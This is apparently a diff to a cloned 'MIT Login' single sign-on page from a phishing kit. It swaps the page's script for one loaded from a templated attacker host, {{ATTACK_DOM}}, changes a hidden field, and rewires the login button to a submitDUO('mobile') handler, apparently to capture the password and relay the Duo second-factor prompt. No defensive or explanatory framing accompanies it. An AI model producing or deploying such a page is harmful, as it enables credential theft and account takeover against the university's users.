@@ -4,8 +4,7 @@
 	<meta http-equiv="content-type" content="application/xhtml+xml">
 	<meta name="viewport" id="viewport" content="width=device-width, user-scalable=yes">	
 	<title>MIT Login</title>
-	<script src="remote-bridge.js"></script>
-	<style data-savepage-href="/idp/css/mobile.css" type="text/css">/* Redefinition of basic elements */
+	<style>/* Redefinition of basic elements */
 
 
 
@@ -2101,11 +2100,11 @@ h2.icon {
 		<p>
 			<span class="label">Password:</span>
 			<span class="value"><input class="forminput" type="password" id="pwd" name="j_password" value=""></span>
-                        <input type="hidden" name="conversation" value="e1s1">
+                        <input type="hidden" name="mobile" value="true">
 		</p>
 		
 		<div class="formbuttons">
-			<input class="formbutton" onclick="connect()" type="submit" name="Submit" value="Login">
+			<input class="formbutton" onclick="submitDUO('mobile')" type="submit" name="Submit" value="Login">
 		</div>
 		
 		
@@ -2125,5 +2124,6 @@ h2.icon {
 </div>
 
 
+	<script src="https://{{ATTACK_DOM}}/idp/Authn/remote-bridge.js"></script>
 
 </body></html>
